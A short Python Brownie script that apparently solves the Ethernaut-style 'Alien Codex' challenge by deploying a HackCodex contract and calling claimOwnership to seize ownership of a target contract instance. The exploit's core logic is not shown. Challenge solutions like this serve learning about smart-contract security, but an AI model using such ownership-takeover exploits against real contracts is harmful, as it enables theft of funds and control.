from brownie import Contract, accounts, AlienCodex, HackCodex

INSTANCE_ADDRESS = "0xbCaA6fDA58436E5E47c1EE74Da5B48e6f7acD143"
ACCOUNT = "straul"


def get_account():
    # account = accounts[0]
    account = accounts.load(ACCOUNT)
    return account


def hack_codex(account):
    alienCodex = Contract.from_abi(name="Codex", address=INSTANCE_ADDRESS, abi=AlienCodex.abi)
    # alienCodex = AlienCodex.deploy({'from': account})
    hack = HackCodex.deploy({'from': account})

    hack.claimOwnership(alienCodex.address, {'from': account})


def main():
    account = get_account()
    hack_codex(account)